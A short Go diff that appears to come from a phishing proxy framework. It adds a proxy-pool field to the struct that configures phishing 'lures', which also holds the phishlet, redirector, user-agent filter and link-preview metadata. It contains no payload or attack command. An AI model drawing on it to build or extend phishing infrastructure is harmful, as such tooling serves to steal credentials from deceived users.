@@ -18,20 +18,21 @@ import (
 var BLACKLIST_MODES = []string{"all", "unauth", "noadd", "off"}
 
 type Lure struct {
-	Id              string `mapstructure:"id" json:"id" yaml:"id"`
-	Hostname        string `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
-	Path            string `mapstructure:"path" json:"path" yaml:"path"`
-	RedirectUrl     string `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
-	Phishlet        string `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`
-	Redirector      string `mapstructure:"redirector" json:"redirector" yaml:"redirector"`
-	PostRedirector  string `mapstructure:"post_redirector" json:"post_redirector" yaml:"post_redirector"`
-	UserAgentFilter string `mapstructure:"ua_filter" json:"ua_filter" yaml:"ua_filter"`
-	Info            string `mapstructure:"info" json:"info" yaml:"info"`
-	OgTitle         string `mapstructure:"og_title" json:"og_title" yaml:"og_title"`
-	OgDescription   string `mapstructure:"og_desc" json:"og_desc" yaml:"og_desc"`
-	OgImageUrl      string `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
-	OgUrl           string `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
-	PausedUntil     int64  `mapstructure:"paused" json:"paused" yaml:"paused"`
+	Id              string          `mapstructure:"id" json:"id" yaml:"id"`
+	Hostname        string          `mapstructure:"hostname" json:"hostname" yaml:"hostname"`
+	Path            string          `mapstructure:"path" json:"path" yaml:"path"`
+	RedirectUrl     string          `mapstructure:"redirect_url" json:"redirect_url" yaml:"redirect_url"`
+	Phishlet        string          `mapstructure:"phishlet" json:"phishlet" yaml:"phishlet"`
+	Redirector      string          `mapstructure:"redirector" json:"redirector" yaml:"redirector"`
+	PostRedirector  string          `mapstructure:"post_redirector" json:"post_redirector" yaml:"post_redirector"`
+	UserAgentFilter string          `mapstructure:"ua_filter" json:"ua_filter" yaml:"ua_filter"`
+	Info            string          `mapstructure:"info" json:"info" yaml:"info"`
+	OgTitle         string          `mapstructure:"og_title" json:"og_title" yaml:"og_title"`
+	OgDescription   string          `mapstructure:"og_desc" json:"og_desc" yaml:"og_desc"`
+	OgImageUrl      string          `mapstructure:"og_image" json:"og_image" yaml:"og_image"`
+	OgUrl           string          `mapstructure:"og_url" json:"og_url" yaml:"og_url"`
+	PausedUntil     int64           `mapstructure:"paused" json:"paused" yaml:"paused"`
+	ProxyPool       []*ProxyConfig  `mapstructure:"proxy_pool" json:"proxy_pool" yaml:"proxy_pool"`
 }
 
 type SubPhishlet struct {
